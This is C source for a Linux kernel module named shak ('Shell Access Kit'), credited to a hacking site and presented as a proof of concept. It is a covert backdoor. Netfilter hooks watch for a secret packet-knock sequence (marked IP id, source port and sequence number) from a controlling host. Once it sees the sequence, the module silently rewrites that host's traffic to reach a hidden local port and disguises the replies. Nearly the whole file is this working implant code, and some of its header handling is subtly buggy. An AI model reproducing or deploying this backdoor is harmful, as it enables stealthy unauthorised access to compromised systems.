/*
 * $$
 * Copyleft by _c757 <www.hackshell.net>
 * This program is a demo component of shak (Shell access kit) project.
 * A *POC* used for traffic hijacking & forwarding.
 */


#include <linux/module.h>
#include <linux/init.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <net/ip.h>
#include <linux/udp.h>
#include <net/tcp.h> 
#include <linux/inetdevice.h>

static struct nf_hook_ops shak_prerouting_hookops;
static struct nf_hook_ops shak_postrouting_hookops;

static struct timespec lastcall = {0};
static int stage = 0;
static __be32 god_ip = 0;

static __be32 z0mbie_ip = 0;
static __be16 z0mbie_port = 0;

static unsigned long dest_port = 0;
module_param(dest_port, ulong, 0);
MODULE_PARM_DESC(dest_port, "The dest port for forwarding to");

static void dnat(struct iphdr *iph, struct tcphdr *th){
	th->dest = htons(dest_port);
}

static void snat(struct iphdr *iph, struct tcphdr *th){
	th->source = htons(z0mbie_port);
}

static void csum(struct sk_buff *skb, struct iphdr *iph, struct tcphdr *th, int tcp){
	unsigned int  len = skb->len;
	struct udphdr *uh;
	skb->csum = skb_checksum(skb, iph->ihl*4,skb->len-iph->ihl*4, 0);
	if(tcp == 1){
		th->check = 0;
		th->check = tcp_v4_check(len - 4*iph->ihl,iph->saddr, iph->daddr, csum_partial((char *)th, len-4*iph->ihl, 0)); //XXX
	}
	else{
		uh = (struct udphdr *)th;
		uh->check = 0;
		uh->check  = csum_tcpudp_magic(iph->saddr, iph->daddr, skb->len - iph->ihl*4, IPPROTO_UDP, skb->csum);	//XXX
	}
	iph->check = 0;
	iph->check = ip_fast_csum((u8 *)iph, iph->ihl);
}


static unsigned int shak_prerouting_hook(
                       unsigned int hooknum,
                       struct sk_buff *skb,
                       const struct net_device *in_iface,
                       const struct net_device *out_iface,
                       int (*okfn)(struct sk_buff *))
{
    struct sk_buff *sockBuff = skb;
    struct iphdr *iph = ip_hdr(skb);
    struct tcphdr *th = NULL;


    if(NULL == sockBuff || NULL == iph || skb->protocol != htons(ETH_P_IP) || 
		(iph->protocol != IPPROTO_TCP && iph->protocol != IPPROTO_UDP) /*|| strncmp(in_iface->name, "lo", 2) == 0*/)
    return NF_ACCEPT;


	//printk(KERN_INFO "ifa_local: %x", ((struct in_device *)(in_iface->ip_ptr))->ifa_list->ifa_local);

	int tcp = 1;
	if(iph->protocol == IPPROTO_UDP) tcp = 0;
    
    th = (struct tcphdr*)(sockBuff->data + (iph->ihl * 4));

    if((ntohs(iph->id) == 0xc757) &&
	(ntohs(th->source) == 0x679) &&
	( (tcp == 0) || (ntohs(th->seq) == 0xc757) )){ //change ntohs to htons
		if(stage == 0){
			stage = 1;
			getnstimeofday(&lastcall);
			god_ip = iph->saddr;
			z0mbie_ip = ntohs(iph->daddr);
			z0mbie_port = ntohs(th->dest);
			printk(KERN_INFO "Got 1st packet with flag from %x, stage setted to 1, z0mbie_port = %d", god_ip, z0mbie_port);
		}
		else if(stage == 1 && z0mbie_port == ntohs(th->dest)){
			if(god_ip == iph->saddr){
				stage = 2;
				printk(KERN_INFO "Got 2nd packet with flag from %x, stage setted to 2. Session started using z0mbie_port = %d", god_ip, z0mbie_port);
			}
			else{
				stage = 0;
				god_ip = 0;
				printk(KERN_INFO "Wtf?");
			}
		}
		else if(stage == 2 && god_ip == iph->saddr && z0mbie_port == ntohs(th->dest)){
			stage = 0;
			god_ip = 0;
			printk(KERN_INFO "Session is being shutted down");
		}
    }
	else if(stage == 2 && god_ip == iph->saddr && (ntohs(th->dest) == z0mbie_port)){
		dnat(iph, th);
		csum(skb, iph, th, tcp);
	}

    return NF_ACCEPT;
}



static unsigned int shak_postrouting_hook(
        unsigned int hooknum,
        struct sk_buff *skb,
        const struct net_device *in_iface,
        const struct net_device *out_iface,
        int (*okfn)(struct sk_buff *))
{
    struct sk_buff *sockBuff = skb;
    struct tcphdr *th = NULL;
    struct iphdr *iph = ip_hdr(skb);
    th = (struct tcphdr*)(sockBuff->data + (iph->ihl * 4));

    if(NULL == sockBuff || NULL == iph || stage != 2 || skb->protocol != htons(ETH_P_IP) || 
		(iph->protocol != IPPROTO_TCP && iph->protocol != IPPROTO_UDP) || iph->daddr != god_ip || ntohs(th->source) != dest_port /*|| strncmp(in_iface->name, "lo", 2) == 0*/){
		return NF_ACCEPT;
	}

	int tcp = 1;
	if(iph->protocol == IPPROTO_UDP) tcp = 0;

		snat(iph, th);
		csum(skb, iph, th, tcp);

    return NF_ACCEPT;
}

static int __init shak_hook_init(void)
{
    int ret = 0;

    printk(KERN_INFO "shak inserted\n");

    if(dest_port == 0){
        printk(KERN_INFO "Specify the dest port with `dest_port={port}` plz");
        return -1;
    }

    shak_prerouting_hookops.hooknum  = NF_INET_PRE_ROUTING;
    shak_prerouting_hookops.pf       = PF_INET;
    shak_prerouting_hookops.hook     = shak_prerouting_hook;
    shak_prerouting_hookops.priority = NF_IP_PRI_FIRST;

    if((ret = nf_register_hook(&shak_prerouting_hookops)) < 0)
    {
        printk(KERN_INFO "nf_register_hook() returned %d", ret);
        nf_unregister_hook(&shak_prerouting_hookops);
        return ret;
    }

    shak_postrouting_hookops.hooknum = NF_INET_POST_ROUTING;
    shak_postrouting_hookops.pf      = PF_INET;
    shak_postrouting_hookops.hook    = shak_postrouting_hook;
    shak_postrouting_hookops.priority= NF_IP_PRI_FIRST;

    if((ret = nf_register_hook(&shak_postrouting_hookops)) < 0)
    {
        printk(KERN_INFO "nf_register_hook() returned %d", ret);
        nf_unregister_hook(&shak_postrouting_hookops);
        return ret;
    }

    return 0;
}


static void __exit shak_hook_exit(void)
{
    printk(KERN_INFO "shak removed\n");
    nf_unregister_hook(&shak_prerouting_hookops);
    nf_unregister_hook(&shak_postrouting_hookops);
}

module_init(shak_hook_init);
module_exit(shak_hook_exit);

MODULE_LICENSE("COPY");
MODULE_AUTHOR("_c757 <www.hackshell.net>");
MODULE_DESCRIPTION("shak(SHell Access Kit)");
MODULE_VERSION("2.6.34.10"); 
